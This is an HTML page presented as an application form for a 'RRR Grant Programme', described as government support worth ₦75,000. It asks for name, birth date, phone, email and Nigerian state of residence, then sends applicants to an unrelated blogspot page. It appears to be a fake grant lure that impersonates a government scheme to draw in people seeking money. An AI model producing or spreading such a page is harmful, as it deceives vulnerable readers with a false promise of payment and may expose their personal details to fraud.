<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RRR Grant Application Form</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#f3f5f7;
    padding:20px;
}

.container{
    max-width:900px;
    margin:auto;
    background:#fff;
    border-radius:15px;
    overflow:hidden;
    box-shadow:0 5px 20px rgba(0,0,0,0.15);
}

.header{
    background:linear-gradient(135deg,#008751,#006b3f);
    color:white;
    text-align:center;
    padding:30px;
}

.header h1{
    font-size:40px;
    margin-bottom:10px;
}

.header p{
    font-size:18px;
}

.amount{
    background:white;
    color:#008751;
    width:250px;
    margin:20px auto 0;
    padding:15px;
    border-radius:10px;
    font-size:32px;
    font-weight:bold;
}

.form-section{
    padding:30px;
}

.form-title{
    color:#008751;
    margin-bottom:20px;
    font-size:28px;
}

.input-group{
    margin-bottom:15px;
}

label{
    display:block;
    margin-bottom:6px;
    font-weight:bold;
}

input,select{
    width:100%;
    padding:14px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    background:#008751;
    color:white;
    border:none;
    padding:15px;
    border-radius:8px;
    font-size:18px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#006b3f;
}

.footer{
    text-align:center;
    padding:20px;
    color:#666;
}
</style>
</head>
<body>

<div class="container">

<div class="header">
<h1>RRR Grant Programme</h1>
<p>Government Support Programme</p>
<div class="amount">₦75,000</div>
</div>

<div class="form-section">

<h2 class="form-title">Application Form</h2>

<form action="https://rrrthird.blogspot.com/p/introductions.html?m=1" method="GET">

<div class="input-group">
<label>Full Name</label>
<input type="text" placeholder="Enter your full name" required>
</div>

<div class="input-group">
<label>Gender</label>
<select required>
<option value="">Select Gender</option>
<option>Male</option>
<option>Female</option>
</select>
</div>

<div class="input-group">
<label>Date of Birth</label>
<input type="date" required>
</div>

<div class="input-group">
<label>Phone Number</label>
<input type="tel" placeholder="080XXXXXXXX" required>
</div>

<div class="input-group">
<label>Email Address (Optional)</label>
<input type="email" placeholder="example@gmail.com">
</div>

<div class="input-group">
<label>State of Residence</label>
<select required>
<option value="">Select State</option>
<option>Abia</option>
<option>Adamawa</option>
<option>Akwa Ibom</option>
<option>Anambra</option>
<option>Bauchi</option>
<option>Bayelsa</option>
<option>Benue</option>
<option>Borno</option>
<option>Cross River</option>
<option>Delta</option>
<option>Ebonyi</option>
<option>Edo</option>
<option>Ekiti</option>
<option>Enugu</option>
<option>FCT Abuja</option>
<option>Gombe</option>
<option>Imo</option>
<option>Jigawa</option>
<option>Kaduna</option>
<option>Kano</option>
<option>Katsina</option>
<option>Kebbi</option>
<option>Kogi</option>
<option>Kwara</option>
<option>Lagos</option>
<option>Nasarawa</option>
<option>Niger</option>
<option>Ogun</option>
<option>Ondo</option>
<option>Osun</option>
<option>Oyo</option>
<option>Plateau</option>
<option>Rivers</option>
<option>Sokoto</option>
<option>Taraba</option>
<option>Yobe</option>
<option>Zamfara</option>
</select>
</div>

<div class="input-group">
<input type="checkbox" required> I confirm that the information provided is correct.
</div>

<button type="submit">APPLY NOW</button>

</form>

</div>

<div class="footer">
RRR Grant Programme © 2026
</div>

</div>

</body>
</html>
